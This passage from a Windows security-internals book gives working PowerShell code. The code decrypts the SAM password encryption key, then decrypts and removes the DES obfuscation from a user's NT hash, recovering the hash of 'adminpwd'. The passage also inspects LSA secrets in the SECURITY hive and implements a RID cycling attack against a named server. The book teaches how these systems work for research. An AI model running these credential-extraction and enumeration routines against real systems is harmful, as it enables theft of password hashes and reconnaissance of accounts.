<p class="TX">First we query the registry value <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> that contains the data associated with the PEK. Next, we find the encrypted PEK in the fixed-attribute registry variable at offset <samp class="SANS_TheSansMonoCd_W5Regular_11">0x68</samp> <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> (remember that this location could change). The first 32-bit integer represents the type of encryption used, either RC4 or AES128. The second 32-bit integer is the length of the trailing encrypted PEK. We extract the data and then call an algorithm-specific decryption function <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>.</p>
<p class="TX">Let’s look at the decryption functions. <a href="chapter10.xhtml#Lis10-25">Listing 10-25</a> shows how to decrypt the password using RC4.</p>
<span id="Lis10-25"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>function Get-MD5Hash([byte[]]$Data) {</b>
<b>    $md5 = [System.Security.Cryptography.MD5]::Create()</b>
<b>    $md5.ComputeHash($Data)</b>
<b>}</b>

PS&gt; <b>function Get-StringBytes([string]$String) {</b>
<b>    [System.Text.Encoding]::ASCII.GetBytes($String + "`0")</b>
<b>}</b>

PS&gt; <b>function Compare-Bytes([byte[]]$Left, [byte[]]$Right) {</b>
<b>    [Convert]::ToBase64String($Left) -eq [Convert]::ToBase64String($Right)</b>
<b>}</b>

<span aria-label=" Page 329. " epub:type="pagebreak" id="pg_329" role="doc-pagebreak"></span><span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>function Unprotect-PasswordEncryptionKeyRC4([byte[]]$Data) {</b>
<b>  </b><span aria-label="annotation3" class="CodeAnnotationCode2">❸</span><b> $syskey = Get-LsaSystemKey</b>
<b>    $qiv = Get-StringBytes '!@#$%^&amp;*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&amp;%'</b>
<b>    $niv = Get-StringBytes '0123456789012345678901234567890123456789'</b>
<b>    $rc4_key = Get-MD5Hash -Data ($Data[0..15] + $qiv + $syskey + $niv)</b>

<b>  </b><span aria-label="annotation4" class="CodeAnnotationCode2">❹</span><b> $decbuf = Unprotect-RC4 -Data $data -Offset 0x10 -Length 32 -Key $rc4_key</b>
<b>    $pek = $decbuf[0..15]</b>
<b>    $hash = $decbuf[16..31]</b>

<b>  </b><span aria-label="annotation5" class="CodeAnnotationCode2">❺</span><b> $pek_hash = Get-MD5Hash -Data ($pek + $niv + $pek + $qiv)</b>
<b>    if (!(Compare-Bytes $hash $pek_hash)) {</b>
<b>       throw "Invalid password key for RC4."</b>
<b>    }</b>

<b>    $pek</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-25: Decrypting the password encryption key using RC4</span></p>
<p class="TX">We start by creating some helper functions for the decryption process, such as <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-MD5Hash</samp>, which calculates an MD5 hash <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. We then start the decryption <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. The <samp class="SANS_TheSansMonoCd_W5Regular_11">$Data</samp> parameter that we pass to the <samp class="SANS_TheSansMonoCd_W5Regular_11">Unprotect-PasswordEncryptionKeyRC4</samp> function is the value extracted from the fixed-attribute buffer.</p>
<p class="TX">The function constructs a long binary string containing the first 16 bytes of the encrypted data (an <i>initialization vector</i>, used to randomize the encrypted data), along with two fixed strings and the system key <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>.</p>
<p class="TX">The binary string is then hashed using the MD5 algorithm to generate a key for the RC4 encryption, which we use to decrypt the remaining 32 bytes of the encrypted data <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. The first 16 decrypted bytes are the PEK, and the second 16 bytes are an MD5 hash used to verify that the decryption was correct. We check the hash value <span aria-label="annotation5" class="CodeAnnotationCode">❺</span> to make sure we’ve successfully decrypted the PEK. If the hash value is not correct, we’ll throw an exception to indicate the failure.</p>
<p class="TX">In <a href="chapter10.xhtml#Lis10-26">Listing 10-26</a>, we define the functions for decrypting the PEK using AES.</p>
<span id="Lis10-26"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span><b> </b>PS&gt; <b>function Unprotect-AES([byte[]]$Data, [byte[]]$IV, [byte[]]$Key) {</b>
<b>     $aes = [System.Security.Cryptography.Aes]::Create()</b>
<b>     $aes.Mode = "CBC"</b>
<b>     $aes.Padding = "PKCS7"</b>
<b>     $aes.Key = $Key</b>
<b>     $aes.IV = $IV</b>
<b>     $aes.CreateDecryptor().TransformFinalBlock($Data, 0, $Data.Length)</b>
<b>}</b>

PS&gt; <b>function Unprotect-PasswordEncryptionKeyAES([byte[]]$Data) {</b>
<b>   </b><span aria-label="annotation2" class="CodeAnnotationCode2">❷</span><b> $syskey = Get-LsaSystemKey</b>
<b>     $hash_len = [System.BitConverter]::ToInt32($Data, 0)</b>
<b>     $enc_len = [System.BitConverter]::ToInt32($Data, 4)</b>
<b>   </b><span aria-label="annotation3" class="CodeAnnotationCode2">❸</span><b> $iv = $Data[0x8..0x17]</b>
<b>     $pek = Unprotect-AES -Key $syskey -IV $iv -Data $Data[0x18..(0x18+$enc_len-1)]</b>

<b>   </b><span aria-label="annotation4" class="CodeAnnotationCode2">❹</span><b> $hash_ofs = 0x18+$enc_len</b>
<b>     $hash_data = $Data[$hash_ofs..($hash_ofs+$hash_len-1)]</b>
<b>     $hash = Unprotect-AES -Key $syskey -IV $iv -Data $hash_data</b>

<b>   </b><span aria-label="annotation5" class="CodeAnnotationCode2">❺</span><b> $sha256 = [System.Security.Cryptography.SHA256]::Create()</b>
<b>     $pek_hash = $sha256.ComputeHash($pek)</b>
<b>     if (!(Compare-Bytes $hash $pek_hash)) {</b>
<b>         throw "Invalid password key for AES."</b>
<b>     }</b>

<b>     $pek</b>
<b>}</b>
</code></pre>
<span aria-label=" Page 330. " epub:type="pagebreak" id="pg_330" role="doc-pagebreak"></span>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-26: Decrypting the password encryption key using AES</span></p>
<p class="TX">We start by defining a function to decrypt an AES buffer with a specified key and initialization vector (IV) <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. The decryption process uses AES in cipher block chaining (CBC) mode with PKCS7 padding. I recommend looking up how these modes function, but their exact details are unimportant for this discussion; just be aware that they must be set correctly or the decryption process will fail.</p>
<p class="TX">Now we define the password decryption function. The key used for AES is the system key <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, with the IV being the first 16 bytes of data after a short header <span aria-label="annotation3" class="CodeAnnotationCode">❸</span> and the encrypted data immediately following. The length of the data to decrypt is stored as a value in the header.</p>
<p class="TX">As with RC4, the encrypted data contains an encrypted hash value we can use to verify that the decryption succeeded. We decrypt the value <span aria-label="annotation4" class="CodeAnnotationCode">❹</span> and then generate the SHA256 hash of the PEK to verify it <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. If the decryption and verification succeeded, we now have a decrypted PEK.</p>
<p class="TX">In <a href="chapter10.xhtml#Lis10-27">Listing 10-27</a>, we use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Unprotect-PasswordEncryptionKey</samp> function to decrypt the password key.</p>
<span id="Lis10-27"></span><pre><code>PS&gt; <b>Unprotect-PasswordEncryptionKey | Out-HexDump</b>
E1 59 B0 6A 50 D9 CA BE C7 EA 6D C5 76 C3 7A C5
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-27: Testing the password encryption key decryption</span></p>
<p class="TX">Again, the actual value generated should look different on different systems. Also note that the PEK is always 16 bytes in size, regardless of the encryption algorithm used to store it.</p>
</section>
<section aria-labelledby="sec26" epub:type="division">
<h5 class="H3" id="sec26"><span id="h3-30"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Decrypting a Password Hash</samp></h5>
<p class="TNI1">Now that we have the PEK, we can decrypt the password hashes we extracted from the user object in <a href="chapter10.xhtml#Lis10-22">Listing 10-22</a>. <a href="chapter10.xhtml#Lis10-28">Listing 10-28</a> defines the function to decrypt the password hash.</p>
<span id="Lis10-28"></span><pre><code>PS&gt; <b>function Unprotect-PasswordHash([byte[]]$Key, [byte[]]$Data,</b>
<b>[int]$Rid, [int]$Type) {</b>
<b>    $enc_type = [BitConverter]::ToInt16($Data, 2)</b>
<span aria-label=" Page 331. " epub:type="pagebreak" id="pg_331" role="doc-pagebreak"></span><b>    switch($enc_type) {</b>
<b>        1 {Unprotect-PasswordHashRC4 -Key $Key -Data $Data -Rid $Rid -Type $Type}</b>
<b>        2 {Unprotect-PasswordHashAES -Key $Key -Data $Data}</b>
<b>        default {throw "Unknown hash encryption format"}</b>
<b>    }</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-28: Decrypting a password hash</span></p>
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">Unprotect-PasswordHash</samp> function takes as arguments the PEK we decrypted, the encrypted hash data, the RID of the user, and the type of hash. LM hashes have a <samp class="SANS_TheSansMonoCd_W5Regular_11">Type</samp> value of <samp class="SANS_TheSansMonoCd_W5Regular_11">1</samp>, while NT hashes have a <samp class="SANS_TheSansMonoCd_W5Regular_11">Type</samp> value of <samp class="SANS_TheSansMonoCd_W5Regular_11">2</samp>.</p>
<p class="TX">The hash data stores the type of encryption; as with the PEK, the supported encryption algorithms are RC4 and AES128. Note that it’s possible for the PEK to be encrypted with RC4 and the password hash with AES, or vice versa. Allowing a mix of encryption types lets systems migrate old hash values from RC4 to AES when a user changes their password.</p>
<p class="TX">We call the algorithm-specific decryption function to decrypt the hash. Note that only the RC4 decryption function needs us to pass it the RID and type of hash; the AES128 decryption function doesn’t require those two values.</p>
<p class="TX">We’ll implement the RC4 hash decryption first, in <a href="chapter10.xhtml#Lis10-29">Listing 10-29</a>.</p>
<span id="Lis10-29"></span><pre><code>PS&gt; <b>function Unprotect-PasswordHashRC4([byte[]]$Key, [byte[]]$Data,</b>
<b>[int]$Rid, [int]$Type) {</b>
<b>  </b><span aria-label="annotation1" class="CodeAnnotationCode2">❶</span><b> if ($Data.Length -lt 0x14) {</b>
<b>        return @()</b>
<b>    }</b>
<b>  </b><span aria-label="annotation2" class="CodeAnnotationCode2">❷</span><b> $iv = switch($Type) {</b>
<b>        1 {"LMPASSWORD"}</b>
<b>        2 {"NTPASSWORD"}</b>
<b>        </b><b>3 {"LMPASSWORDHISTORY"}</b>
<b>        4 {"NTPASSWORDHISTORY"}</b>
<b>        5 {"MISCCREDDATA"}</b>
<b>    }</b>
<b>  </b><span aria-label="annotation3" class="CodeAnnotationCode2">❸</span><b> $key_data = $Key + [BitConverter]::GetBytes($Rid) + (Get-StringBytes $iv)</b>
<b>    $rc4_key = Get-MD5Hash -Data $key_data</b>
<b>  </b><span aria-label="annotation4" class="CodeAnnotationCode2">❹</span><b> Unprotect-RC4 -Key $rc4_key -Data $Data -Offset 4 -Length 16</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-29: Decrypting a password hash using RC4</span></p>
<p class="TX">We first check the length of the data <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. If it’s less than 20 bytes in size, we assume the hash isn’t present. For example, the LM hash is not stored by default on modern versions of Windows, so attempting to decrypt that hash will return an empty array.</p>
<p class="TX">Assuming there is a hash to decrypt, we then need an IV string based on the type of hash being decrypted <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. In addition to LM and NT hashes, the LSA can decrypt a few other hash types, such as the password history, which stores previous password hashes to prevent users from changing back to an old password.</p>
<p class="TX"><span aria-label=" Page 332. " epub:type="pagebreak" id="pg_332" role="doc-pagebreak"></span>We build a key by concatenating the PEK, the RID in its byte form, and the IV string and using it to generate an MD5 hash <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. We then use this new key to finally decrypt the password hash <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>.</p>
<p class="TX">Decrypting the password using AES is simpler than with RC4, as you can see in <a href="chapter10.xhtml#Lis10-30">Listing 10-30</a>.</p>
<span id="Lis10-30"></span><pre><code>PS&gt; <b>function Unprotect-PasswordHashAES([byte[]]$Key, [byte[]]$Data) {</b>
<b>  </b><span aria-label="annotation1" class="CodeAnnotationCode2">❶</span><b> $length = [BitConverter]::ToInt32($Data, 4)</b>
<b>    if ($length -eq 0) {</b>
<b>        return @()</b>
<b>    }</b>
<b>  </b><span aria-label="annotation2" class="CodeAnnotationCode2">❷</span><b> $IV = $Data[8..0x17]</b>
<b>    $value = $Data[0x18..($Data.Length-1)]</b>
<b>  </b><span aria-label="annotation3" class="CodeAnnotationCode2">❸</span><b> Unprotect-AES -Key $Key -IV $IV -Data $value</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-30: Decrypting a password hash using AES</span></p>
<p class="TX">The password contains the data length, which we use to determine if we need to return an empty buffer <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. We can then extract the IV <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> and the encrypted value from the buffer and decrypt the value using the PEK <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>.</p>
<p class="TX"><a href="chapter10.xhtml#Lis10-31">Listing 10-31</a> decrypts the LM and NT hashes.</p>
<span id="Lis10-31"></span><pre><code>PS&gt; <b>$pek = Unprotect-PasswordEncryptionKey</b>
PS&gt; <b>$lm_dec = Unprotect-PasswordHash -Key $pek -Data $lm -Rid 500 -Type 1</b>
PS&gt; <b>$lm_dec | Out-HexDump</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span>
PS&gt; <b>$nt_dec = Unprotect-PasswordHash -Key $pek -Data $nt -Rid 500 -Type 2</b>
PS&gt; <b>$nt_dec | Out-HexDump</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> 40 75 5C F0 7C B3 A7 17 46 34 D6 21 63 CE 7A DB
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-31: Decrypting the LM and NT hashes</span></p>
<p class="TX">Note that in this example there is no LM hash, so the decryption process returns an empty array <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. However, the NT hash decrypts to a 16-byte value <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
</section>
<section aria-labelledby="sec27" epub:type="division">
<h5 class="H3" id="sec27"><span id="h3-31"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Deobfuscating the Password Hash</samp></h5>
<p class="TNI1">We now have a decrypted password hash, but there is one final step we need to perform to retrieve the original hash. The password hash is still encrypted with the Data Encryption Standard (DES) algorithm. DES was the original obfuscation mechanism for hashes in the original version of NT before the introduction of the system key. All this RC4 and AES decryption merely got us back to where we started.</p>
<p class="TX">We first need to generate the DES keys to decrypt the hash value (<a href="chapter10.xhtml#Lis10-32">Listing 10-32</a>).</p>
<span id="Lis10-32"></span><pre><code>PS&gt; <b>function Get-UserDESKey([uint32]$Rid) {</b>
<b>     $ba = [System.BitConverter]::GetBytes($Rid)</b>
<b>     $key1 = ConvertTo-DESKey $ba[2], $ba[1], $ba[0], $ba[3], $ba[2], $ba[1], </b>
<b>$ba[0]</b>
<b>     $key2 = ConvertTo-DESKey $ba[1], $ba[0], $ba[3], $ba[2], $ba[1], $ba[0], </b>
<span aria-label=" Page 333. " epub:type="pagebreak" id="pg_333" role="doc-pagebreak"></span><b>$ba[3]</b>
<b>    $key1, $key2</b>
<b>}</b>

PS&gt; <b>function ConvertTo-DESKey([byte[]]$Key) {</b>
<b>     $k = [System.BitConverter]::ToUInt64($Key + 0, 0)</b>
<b>     for($i = 7; $i -ge 0; $i--) {</b>
<b>         $curr = ($k -shr ($i * 7)) -band 0x7F</b>
<b>         $b = $curr</b>
<b>         $b = $b -bxor ($b -shr 4)</b>
<b>         $b = $b -bxor ($b -shr 2)</b>
<b>         $b = $b -bxor ($b -shr 1)</b>
<b>         ($curr -shl 1) -bxor ($b -band 0x1) -bxor 1</b>
<b>     }</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-32: Generating the DES keys for the RID</span></p>
<p class="TX">The first step in decrypting the hash is to generate two 64-bit DES keys based on the value of the RID. In <a href="chapter10.xhtml#Lis10-32">Listing 10-32</a>, we unpack the RID into two 56-bit arrays as the base for the two keys. We then expand each 56-bit array to 64 bits by taking each 7 bits of the array and calculating a parity bit for each byte. The parity bit is set in the least significant bit of each byte, to ensure that each byte has an odd number of bits.</p>
<p class="TX">With the two keys, we can decrypt the hash fully. First we’ll need a few functions, which we define in <a href="chapter10.xhtml#Lis10-33">Listing 10-33</a>.</p>
<span id="Lis10-33"></span><pre><code>PS&gt; <b>function Unprotect-DES([byte[]]$Key, [byte[]]$Data, [int]$Offset) {</b>
<b>    $des = [Security.Cryptography.DES]::Create()</b>
<b>    $des.Key = $Key</b>
<b>    $des.Mode = "ECB"</b>
<b>    $des.Padding = "None"</b>
<b>    $des.CreateDecryptor().TransformFinalBlock($Data, $Offset, 8)</b>
<b>}</b>

PS&gt; <b>function Unprotect-PasswordHashDES([byte[]]$Hash, [uint32]$Rid) {</b>
<b>    $keys = Get-UserDESKey -Rid $Rid</b>
<b>    (Unprotect-DES -Key $keys[0] -Data $Hash -Offset 0) +</b>
<b>    (Unprotect-DES -Key $keys[1] -Data $Hash -Offset 8)</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-33: Decrypting password hashes using DES</span></p>
<p class="TX">We start by defining a simple DES decryption function. The algorithm uses DES in electronic code book (ECB) mode with no padding. We then define a function to decrypt the hash. The first 8-byte block is decrypted with the first key, and the second with the second key. Following that, we concatenate the decrypted hash into a single 16-byte result.</p>
<p class="TX">Finally, we can decrypt the password hash and compare it against the real value, as shown in <a href="chapter10.xhtml#Lis10-34">Listing 10-34</a>.</p>
<span id="Lis10-34"></span><pre><code>PS&gt; <b>Unprotect-PasswordHashDES -Hash $nt_dec -Rid 500 | Out-HexDump</b>
51 1A 3B 26 2C B6 D9 32 0E 9E B8 43 15 8D 85 22

<span aria-label=" Page 334. " epub:type="pagebreak" id="pg_334" role="doc-pagebreak"></span>PS&gt; <b>Get-MD4Hash -String "adminpwd" | Out-HexDump</b>
51 1A 3B 26 2C B6 D9 32 0E 9E B8 43 15 8D 85 22
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-34: Verifying the NT hash</span></p>
<p class="TX">If the hash was correctly decrypted, we should expect it to match the MD4 hash of the user’s password. In this case, the user’s password was set to <i>adminpwd</i> (I know, not strong). The decrypted NT hash and the generated hash match exactly.</p>
<p class="TX">Let’s now look at the SECURITY database, which stores the LSA policy. We won’t spend much time on this database, as we can directly extract most of its information using the domain policy remote service described earlier in the chapter.</p>
</section>
</section>
<section aria-labelledby="sec28" epub:type="division">
<h4 class="H2" id="sec28"><span id="h2-101"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Inspecting the SECURITY Database</samp></h4>
<p class="TNI1">The LSA policy is stored in the SECURITY database registry key, which is located at <i>REGISTRY\MACHINE\SECURITY</i>. As with the SAM database registry key, only the <i>SYSTEM</i> user can access the key directly, but we can use the mapped drive provider from <a href="chapter10.xhtml#Lis10-21">Listing 10-21</a> to inspect its contents.</p>
<p class="TX"><a href="chapter10.xhtml#Lis10-35">Listing 10-35</a> shows a few levels of the SECURITY database registry key. Run this command as an administrator.</p>
<span id="Lis10-35"></span><pre><code>PS&gt; <b>ls -Depth 1 -Recurse SEC:\SECURITY</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> SECURITY\Cache                            Key
SECURITY\Policy                           Key
SECURITY\RXACT                            Key
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> SECURITY\SAM                              Key
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> SECURITY\Policy\Accounts                  Key
SECURITY\Policy\CompletedPrivilegeUpdates Key
SECURITY\Policy\DefQuota                  Key
SECURITY\Policy\Domains                   Key
SECURITY\Policy\LastPassCompleted         Key
SECURITY\Policy\PolAcDmN                  Key
SECURITY\Policy\PolAcDmS                  Key
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> SECURITY\Policy\PolAdtEv                  Key
<span aria-label="annotation5" class="CodeAnnotationHang1">❺</span> SECURITY\Policy\PolAdtLg                  Key
SECURITY\Policy\PolDnDDN                  Key
SECURITY\Policy\PolDnDmG                  Key
SECURITY\Policy\PolDnTrN                  Key
SECURITY\Policy\PolEKList                 Key
SECURITY\Policy\PolMachineAccountR        Key
SECURITY\Policy\PolMachineAccountS        Key
SECURITY\Policy\PolOldSyskey              Key
SECURITY\Policy\PolPrDmN                  Key
SECURITY\Policy\PolPrDmS                  Key
SECURITY\Policy\PolRevision               Key
<span aria-label="annotation6" class="CodeAnnotationHang1">❻</span> SECURITY\Policy\SecDesc                   Key
<span aria-label="annotation7" class="CodeAnnotationHang1">❼</span> SECURITY\Policy\Secrets                   Key
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-35: Listing the contents of the SECURITY database registry key</span></p>
<p class="TX">We’ll discuss only a few of these registry keys. The <i>Cache</i> key <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> contains a list of cached domain credentials that can be used to authenticate a user <span aria-label=" Page 335. " epub:type="pagebreak" id="pg_335" role="doc-pagebreak"></span>even if access to the domain controller is lost. We’ll cover the use of this key in <span class="Xref"><a href="chapter12.xhtml">Chapter 12</a></span>, when we discuss interactive authentication.</p>
<p class="TX">The <i>SAM</i> key <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> is a link to the full SAM database registry key whose contents we showed in <a href="chapter10.xhtml#Lis10-21">Listing 10-21</a>. It exists here for convenience. The <i>Policy\Accounts</i> key <span aria-label="annotation3" class="CodeAnnotationCode">❸</span> is used to store the account objects for the policy. The <i>Policy</i> key also contains other system policies and configuration; for example, <i>PolAdtEv</i> <span aria-label="annotation4" class="CodeAnnotationCode">❹</span> and <i>PolAdtLg</i> <span aria-label="annotation5" class="CodeAnnotationCode">❺</span> contain configurations related to the system’s audit policy, which we analyzed in <span class="Xref"><a href="chapter9.xhtml">Chapter 9</a></span>.</p>
<p class="TX">The security descriptor that secures the policy object is found in the <i>Policy\SecDesc</i> key <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>. Each securable object in the policy has a similar key to persist the security descriptor.</p>
<p class="TX">Finally, the <i>Policy\Secrets</i> key <span aria-label="annotation7" class="CodeAnnotationCode">❼</span> is used to store secret objects. We dig further into the children of the <i>Secrets</i> key in <a href="chapter10.xhtml#Lis10-36">Listing 10-36</a>. You’ll need to run these commands as an administrator.</p>
<span id="Lis10-36"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>ls SEC:\SECURITY\Policy\Secrets</b>
Name         TypeName
----         --------
$MACHINE.ACC Key
DPAPI_SYSTEM Key
NL$KM        Key

<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>ls SEC:\SECURITY\Policy\Secrets\DPAPI_SYSTEM</b>
Name     TypeName
----     --------
CupdTime Key
CurrVal  Key
OldVal   Key
OupdTime Key
SecDesc  Key

PS&gt; <b>$key = Get-Item SEC:\SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal</b>
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>$key.DefaultValue.Data | Out-HexDump -ShowAll</b>
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 00 00 00 01 5F 5D 25 70 36 13 17 41 92 57 5F 50  - ...._]%p6..A.W_P
00000010: 89 EA AA 35 03 00 00 00 00 00 00 00 DF D6 A4 60  - ...5...........`
00000020: 5B FB EE B2 04 04 1E A9 E9 5B FA 77 85 5E 57 07  - [........[.w.^W.
00000030: CC 2A 53 BF 2A 84 E0 88 86 B9 7A 55 E7 63 79 6C  - .*S.*.....zU.cyl
00000040: 8A 72 85 67 31 BD 52 3E 11 E0 49 A6 AE 9B BE B5  - .r.g1.R&gt;..I.....
00000050: 21 15 F0 1D 75 C3 F8 CA 46 CC 4A 58 B3 9C 4F 1E  - !...u...F.JX..O.
00000060: D9 8B 61 6C A4 A0 77 18 F1 42 61 43 C6 12 CE 22  - ..al..w..BaC..."
00000070: 03 EC 80 1B 51 07 F7 16 50 CD 04 71              - ....Q...P..q
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-36: Enumerating the children of the</span> <samp class="SANS_Futura_Std_Book_11">SECURITY\Policy\Secrets</samp> <span class="Futura_Std_Book_Oblique_I_11">key</span></p>
<p class="TX"><a href="chapter10.xhtml#Lis10-36">Listing 10-36</a> lists the subkeys of the <i>Secrets</i> key <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. The name of each subkey is the string used when opening the secret via the domain policy remote service. For example, we can see the <i>DPAPI_SYSTEM</i> secret we accessed in <a href="chapter10.xhtml#Lis10-17">Listing 10-17</a> in the output.</p>
<p class="TX">When we inspect the values of that key <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, we find its current and old values and timestamps, as well as the security descriptor for the secret object. The secret’s contents are stored as the default value in the key, so we <span aria-label=" Page 336. " epub:type="pagebreak" id="pg_336" role="doc-pagebreak"></span>can display it as hex <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. You might notice that the value of the secret isn’t the same as the one we dumped via the domain policy remote service. As with the user object data, the LSA will try to obfuscate values in the registry to prevent trivial disclosure of the contents. The system key is used, but with a different algorithm; I won’t dig further into the details of this.</p>
</section>
</section>
<section aria-labelledby="sec29" epub:type="division">
<h3 class="H1" id="sec29"><span id="h1-79"></span><samp class="SANS_Futura_Std_Bold_B_11">Worked Examples</samp></h3>
<p class="TNI1">Let’s walk through some examples to illustrate how you can use the various commands you saw in this chapter for security research or systems analysis purposes.</p>
<section aria-labelledby="sec30" epub:type="division">
<h4 class="H2" id="sec30"><span id="h2-102"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">RID Cycling</samp></h4>
<p class="TNI1">In <span class="Xref">“Name Lookup and Mapping” on page 323</span>, I mentioned an attack called RID cycling that uses the domain policy remote service to find the users and groups present on a computer without having access to the SAM remote service. In <a href="chapter10.xhtml#Lis10-37">Listing 10-37</a>, we perform the attack using some of the commands introduced in this chapter.</p>
<span id="Lis10-37"></span><pre><code>PS&gt; <b>function Get-SidNames {</b>
<b>     param(</b>
<b>      </b><span aria-label="annotation1" class="CodeAnnotationCode">❶</span><b> [string]$Server,</b>
<b>         [string]$Domain,</b>
<b>         [int]$MinRid = 500,</b>
<b>         [int]$MaxRid = 1499</b>
<b>     )</b>
<b>     if ("" -eq $Domain) {</b>
<b>        $Domain = $Server</b>
<b>     }</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span><b> Use-NtObject($policy = Get-LsaPolicy -SystemName $Server -Access </b>
<b>LookupNames) {</b>
<b>    </b> <span aria-label="annotation3" class="CodeAnnotationHang1">❸</span><b> $domain_sid = Get-LsaSid $policy "$Domain\" </b>
<b>    </b> <span aria-label="annotation4" class="CodeAnnotationHang1">❹</span><b> $sids = $MinRid..$MaxRid | ForEach-Object {</b>
<b>           Get-NtSid -BaseSid $domain_sid -RelativeIdentifier $_</b>
<b>       }</b>
<b>     </b><span aria-label="annotation5" class="CodeAnnotationHang1">❺</span><b> Get-LsaName -Policy $policy -Sid $sids | Where-Object NameUse </b>
<b>-ne "Unknown" </b>
<b>    }</b>
<b>}</b>

<span aria-label="annotation6" class="CodeAnnotationHang1">❻</span><b> </b>PS&gt; <b>Get-SidNames -Server "CINNABAR" | Select-Object QualifiedName, Sddl</b>
QualifiedName              <b> </b>Sddl
-------------              <b> </b>----
CINNABAR\Administrator    <b>  </b>S-1-5-21-2182728098-2243322206-2265510368-500
CINNABAR\Guest    <b>  </b>    <b>  </b>  S-1-5-21-2182728098-2243322206-2265510368-501
CINNABAR\DefaultAccount    <b> </b>S-1-5-21-2182728098-2243322206-2265510368-503
CINNABAR\WDAGUtilityAccount S-1-5-21-2182728098-2243322206-2265510368-504
CINNABAR\None    <b>  </b>    <b>  </b>   S-1-5-21-2182728098-2243322206-2265510368-513
CINNABAR\LocalAdmin         S-1-5-21-2182728098-2243322206-2265510368-1000
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-37: A simple RID cycling implementation</span></p>
<p class="TX"><span aria-label=" Page 337. " epub:type="pagebreak" id="pg_337" role="doc-pagebreak"></span>First, we define the function to perform the RID cycling attack. We need four parameters <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>: the server that we want to enumerate, the domain in the server to enumerate, and minimum and maximum RID values to check. The lookup process can request only 1,000 SIDs at a time, so we set a default range within that limit, from <samp class="SANS_TheSansMonoCd_W5Regular_11">500</samp> to <samp class="SANS_TheSansMonoCd_W5Regular_11">1499</samp> inclusive, which should cover the range of RIDs used for user accounts and groups.</p>
